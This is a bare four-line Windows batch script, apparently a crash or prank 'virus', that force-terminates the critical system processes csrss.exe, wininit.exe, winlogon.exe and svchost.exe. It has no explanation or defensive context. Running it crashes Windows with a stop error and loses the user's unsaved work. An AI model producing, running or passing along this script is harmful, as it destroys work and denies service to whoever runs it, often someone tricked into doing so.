@echo off
taskkill /f /im "csrss.exe"
taskkill /f /im "wininit.exe"
taskkill /f /im "winlogon.exe"
taskkill /f /im "svchost.exe"